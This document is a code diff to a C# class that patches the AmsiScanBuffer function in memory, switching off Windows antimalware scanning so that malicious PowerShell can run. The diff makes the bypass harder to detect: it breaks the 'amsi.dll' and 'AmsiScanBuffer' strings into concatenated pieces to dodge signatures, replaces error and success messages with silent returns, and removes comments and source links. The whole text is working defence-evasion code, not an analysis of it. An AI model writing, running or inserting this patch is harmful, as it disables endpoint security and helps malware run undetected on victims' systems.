@@ -817,8 +817,6 @@ using System.Runtime.InteropServices;
 using System;
 public class AMSI
 {
-    //https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-
     [DllImport("kernel32")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
     [DllImport("kernel32")]
@@ -831,35 +829,29 @@ public class AMSI
 
     public static void Disable()
     {
-        IntPtr TargetDLL = LoadLibrary("amsi.dll");
+        IntPtr TargetDLL = LoadLibrary("a" + "ms" + "i.dll");
         if (TargetDLL == IntPtr.Zero)
         {
-            Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
+            return;
         }
 
-        IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
-        if (AmsiScanBufferPtr == IntPtr.Zero)
+        IntPtr asbf = GetProcAddress(TargetDLL, "Am" + "siSc" + "anBuffer");
+        if (asbf == IntPtr.Zero)
         {
-            Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
+            return;
         }
 
         UIntPtr dwSize = (UIntPtr)5;
         uint Zero = 0;
-        if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
+        if (!VirtualProtect(asbf, dwSize, 0x40, out Zero))
         {
-            Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
+            return;
         }
 
-        /*
-         * This is a new technique, and is still working.
-         * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
-         */
         Byte[] Patch = { 0x31, 0xff, 0x90 };
         IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
         Marshal.Copy(Patch, 0, unmanagedPointer, 3);
-        MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
-
-        Console.WriteLine("AmsiScanBuffer patch has been applied.");
+        MoveMemory(asbf + 0x001b, unmanagedPointer, 3);
     }
 
 }
